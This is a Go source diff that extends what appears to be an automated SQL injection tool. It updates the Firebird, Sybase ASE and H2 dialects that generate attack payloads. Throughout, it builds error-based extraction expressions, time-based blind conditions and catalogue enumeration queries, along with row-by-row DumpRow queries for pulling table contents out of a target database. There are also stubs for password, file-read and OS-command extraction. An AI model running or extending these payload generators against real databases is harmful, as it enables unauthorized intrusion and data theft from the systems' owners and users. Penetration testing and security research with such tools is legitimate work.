@@ -841,13 +1349,14 @@ func firebirdDialect() *Dialect {
 			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INTEGER)", expr), true
 		},
 		Databases: func() string {
-			return "(SELECT LIST(rdb$database_name,',') FROM rdb$databases)"
+			return "(SELECT LIST(rdb$database_name,ASCII_CHAR(30)) FROM rdb$databases)"
 		},
-		Tables: func(db string) string {
-			return "(SELECT LIST(rdb$relation_name,',') FROM rdb$relations WHERE rdb$system_flag=0)"
+		Schemas: func(db string) string { return "" },
+		Tables: func(db, schema string) string {
+			return "(SELECT LIST(rdb$relation_name,ASCII_CHAR(30)) FROM rdb$relations WHERE rdb$system_flag=0)"
 		},
-		Columns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT LIST(rdb$field_name,',') FROM rdb$relation_fields WHERE rdb$relation_name=%s)", literal(strings.ToUpper(table)))
+		Columns: func(db, schema, table string) string {
+			return fmt.Sprintf("(SELECT LIST(rdb$field_name,ASCII_CHAR(30)) FROM rdb$relation_fields WHERE rdb$relation_name=%s)", literal(strings.ToUpper(table)))
 		},
 		CurrentDB:  func() string { return "CURRENT_DATABASE" },
 		Version:    func() string { return "rdb$get_context('SYSTEM','ENGINE_VERSION')" },
@@ -858,55 +1367,79 @@ func firebirdDialect() *Dialect {
 		Users:      func() string { return "''" },
 		Passwords:  func() string { return "''" },
 		Roles:      func() string { return "''" },
-		RowCount: func(db, table string) string {
-			return fmt.Sprintf("(SELECT COUNT(*) FROM %s)", quoteDouble(strings.ToUpper(table)))
+		RowCount: func(ref TableRef, where string) string {
+			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", firebirdTable(ref), whereClause(where))
 		},
-		DumpRow: func(db, table string, cols []string, offset int) string {
+		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
 			parts := make([]string, 0, len(cols))
 			for _, c := range cols {
 				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR(4000)),'NULL')", quoteDouble(strings.ToUpper(c))))
 			}
-			return fmt.Sprintf("(SELECT %s FROM %s ROWS %d TO %d)", strings.Join(parts, "||'|'||"), quoteDouble(strings.ToUpper(table)), offset+1, offset+1)
+			return fmt.Sprintf("(SELECT %s FROM %s%s ROWS %d TO %d)", joinExpr(parts, "ASCII_CHAR(31)", true), firebirdTable(ref), whereClause(where), offset+1, offset+1)
 		},
 		FileRead: func(path string) (string, bool) { return "", false },
 		OSCmd:    func(cmd string) (string, bool) { return "", false },
 		SearchTables: func(keyword string) string {
-			return fmt.Sprintf("(SELECT LIST(rdb$relation_name,',') FROM rdb$relations WHERE rdb$relation_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
+			return fmt.Sprintf("(SELECT LIST(rdb$relation_name,ASCII_CHAR(30)) FROM rdb$relations WHERE rdb$relation_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
 		},
 		SearchColumns: func(keyword string) string {
-			return fmt.Sprintf("(SELECT LIST(rdb$field_name,',') FROM rdb$relation_fields WHERE rdb$field_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
+			return fmt.Sprintf("(SELECT LIST(rdb$field_name,ASCII_CHAR(30)) FROM rdb$relation_fields WHERE rdb$field_name LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
 		},
-		TableColumns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT LIST(rdb$field_name,',') FROM rdb$relation_fields WHERE rdb$relation_name=%s)", literal(strings.ToUpper(table)))
+		TableColumns: func(db, schema, table string) string {
+			return fmt.Sprintf("(SELECT LIST(rdb$field_name,ASCII_CHAR(30)) FROM rdb$relation_fields WHERE rdb$relation_name=%s)", literal(strings.ToUpper(table)))
 		},
 		AllTables: func() string {
-			return "(SELECT LIST(rdb$relation_name,',') FROM rdb$relations WHERE rdb$system_flag=0)"
+			return "(SELECT LIST(rdb$relation_name,ASCII_CHAR(30)) FROM rdb$relations WHERE rdb$system_flag=0)"
 		},
 		AllColumns: func() string {
-			return "(SELECT LIST(rdb$field_name,',') FROM rdb$relation_fields)"
+			return "(SELECT LIST(rdb$field_name,ASCII_CHAR(30)) FROM rdb$relation_fields)"
 		},
 	}
 }
+
+// --- Sybase ASE ----------------------------------------------------------
 
 func sybaseDialect() *Dialect {
 	d := mssqlDialect()
 	d.Name = "Sybase"
-	d.Aliases = defaultAliases("Sybase", "SQLAnywhere")
+	d.Aliases = defaultAliases("Sybase", "SQLAnywhere", "SAP ASE")
+	d.Concat = concatPlus
 	d.Version = func() string { return "@@VERSION" }
 	d.Databases = func() string { return "(SELECT LIST(name,',') FROM sysdatabases)" }
-	d.Tables = func(db string) string {
+	d.Schemas = func(db string) string { return "" }
+	d.Tables = func(db, schema string) string {
+		if db == "" {
+			return "(SELECT LIST(name,',') FROM sysobjects WHERE type='U')"
+		}
 		return fmt.Sprintf("(SELECT LIST(name,',') FROM %s..sysobjects WHERE type='U')", quoteBracket(db))
 	}
-	d.Columns = func(db, table string) string {
+	d.Columns = func(db, schema, table string) string {
+		if db == "" {
+			return fmt.Sprintf("(SELECT LIST(name,',') FROM syscolumns WHERE id=OBJECT_ID(%s))", literal(table))
+		}
 		return fmt.Sprintf("(SELECT LIST(name,',') FROM %s..syscolumns WHERE id=OBJECT_ID(%s))", quoteBracket(db), literal(db+".."+table))
+	}
+	d.RowCount = func(ref TableRef, where string) string {
+		return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", sybaseTable(ref), whereClause(where))
+	}
+	d.DumpRow = func(ref TableRef, cols []string, offset int, where string) string {
+		parts := make([]string, 0, len(cols))
+		for _, c := range cols {
+			parts = append(parts, fmt.Sprintf("ISNULL(CAST(%s AS VARCHAR(8000)),'NULL')", quoteBracket(c)))
+		}
+		// ASE has no portable OFFSET; TOP with a running total keeps the scalar
+		// extraction valid and the explorer falls back to single-row batches.
+		return fmt.Sprintf("(SELECT TOP 1 %s FROM %s%s)", joinExpr(parts, "CHAR(31)", false), sybaseTable(ref), whereClause(where))
 	}
 	return d
 }
 
+// --- H2 ------------------------------------------------------------------
+
 func h2Dialect() *Dialect {
 	return &Dialect{
 		Name:    "H2",
-		Aliases: defaultAliases("H2"),
+		Aliases: defaultAliases("H2", "H2 Database"),
 		Quote:   quoteDouble,
 		Str:     literal,
 		Concat:  concatFunc("CONCAT"),
@@ -915,10 +1448,10 @@ func h2Dialect() *Dialect {
 		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
 		Marker:  markerFunc,
 		SleepExpr: func(n int) string {
-			return fmt.Sprintf("(SELECT COUNT(*) FROM SYSTEM_RANGE(1,100000000))")
+			return fmt.Sprintf("(SELECT COUNT(*) FROM SYSTEM_RANGE(1,%d))", 100000000*n/2)
 		},
 		TimeCondition: func(cond string, n int) string {
-			return fmt.Sprintf("CASE WHEN (%s) THEN (SELECT COUNT(*) FROM SYSTEM_RANGE(1,100000000)) ELSE 1 END", cond)
+			return fmt.Sprintf("CASE WHEN (%s) THEN (SELECT COUNT(*) FROM SYSTEM_RANGE(1,%d)) ELSE 1 END", cond, 100000000*n/2)
 		},
 		ErrorExpr: func(expr string) (string, bool) {
 			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT)", expr), true
@@ -926,11 +1459,26 @@ func h2Dialect() *Dialect {
 		Databases: func() string {
 			return "(SELECT LISTAGG(SCHEMA_NAME,CHAR(30)) WITHIN GROUP (ORDER BY SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA)"
 		},
-		Tables: func(db string) string {
-			return fmt.Sprintf("(SELECT LISTAGG(TABLE_NAME,CHAR(30)) WITHIN GROUP (ORDER BY TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=%s)", literal(strings.ToUpper(db)))
+		Schemas: func(db string) string { return "" },
+		Tables: func(db, schema string) string {
+			sch := strings.TrimSpace(schema)
+			if sch == "" {
+				sch = strings.TrimSpace(db)
+			}
+			if sch == "" {
+				sch = "PUBLIC"
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(TABLE_NAME,CHAR(30)) WITHIN GROUP (ORDER BY TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=%s)", literal(strings.ToUpper(sch)))
 		},
-		Columns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME,CHAR(30)) WITHIN GROUP (ORDER BY ORDINAL_POSITION) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=%s AND TABLE_NAME=%s)", literal(strings.ToUpper(db)), literal(strings.ToUpper(table)))
+		Columns: func(db, schema, table string) string {
+			sch := strings.TrimSpace(schema)
+			if sch == "" {
+				sch = strings.TrimSpace(db)
+			}
+			if sch == "" {
+				sch = "PUBLIC"
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME,CHAR(30)) WITHIN GROUP (ORDER BY ORDINAL_POSITION) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=%s AND TABLE_NAME=%s)", literal(strings.ToUpper(sch)), literal(strings.ToUpper(table)))
 		},
 		CurrentDB:  func() string { return "DATABASE()" },
 		Version:    func() string { return "H2VERSION()" },
@@ -941,15 +1489,15 @@ func h2Dialect() *Dialect {
 		Users:      func() string { return "''" },
 		Passwords:  func() string { return "''" },
 		Roles:      func() string { return "''" },
-		RowCount: func(db, table string) string {
-			return fmt.Sprintf("(SELECT COUNT(*) FROM %s.%s)", quoteDouble(strings.ToUpper(db)), quoteDouble(strings.ToUpper(table)))
+		RowCount: func(ref TableRef, where string) string {
+			return fmt.Sprintf("(SELECT COUNT(*) FROM %s%s)", h2Table(ref), whereClause(where))
 		},
-		DumpRow: func(db, table string, cols []string, offset int) string {
+		DumpRow: func(ref TableRef, cols []string, offset int, where string) string {
 			parts := make([]string, 0, len(cols))
 			for _, c := range cols {
 				parts = append(parts, fmt.Sprintf("COALESCE(CAST(%s AS VARCHAR),'NULL')", quoteDouble(strings.ToUpper(c))))
 			}
-			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s.%s LIMIT 1 OFFSET %d)", strings.Join(parts, ",'|',"), quoteDouble(strings.ToUpper(db)), quoteDouble(strings.ToUpper(table)), offset)
+			return fmt.Sprintf("(SELECT CONCAT(%s) FROM %s%s LIMIT 1 OFFSET %d)", joinExpr(parts, "CHAR(31)", false), h2Table(ref), whereClause(where), offset)
 		},
 		FileRead: func(path string) (string, bool) { return "", false },
 		OSCmd:    func(cmd string) (string, bool) { return "", false },
@@ -959,8 +1507,15 @@ func h2Dialect() *Dialect {
 		SearchColumns: func(keyword string) string {
 			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME,CHAR(30)) WITHIN GROUP (ORDER BY COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE %s)", literal("%"+strings.ToUpper(keyword)+"%"))
 		},
-		TableColumns: func(db, table string) string {
-			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME||':'||DATA_TYPE,CHAR(30)) WITHIN GROUP (ORDER BY ORDINAL_POSITION) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=%s AND TABLE_NAME=%s)", literal(strings.ToUpper(db)), literal(strings.ToUpper(table)))
+		TableColumns: func(db, schema, table string) string {
+			sch := strings.TrimSpace(schema)
+			if sch == "" {
+				sch = strings.TrimSpace(db)
+			}
+			if sch == "" {
+				sch = "PUBLIC"
+			}
+			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME||':'||DATA_TYPE,CHAR(30)) WITHIN GROUP (ORDER BY ORDINAL_POSITION) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=%s AND TABLE_NAME=%s)", literal(strings.ToUpper(sch)), literal(strings.ToUpper(table)))
 		},
 		AllTables: func() string {
 			return "(SELECT LISTAGG(TABLE_NAME,CHAR(30)) WITHIN GROUP (ORDER BY TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES)"
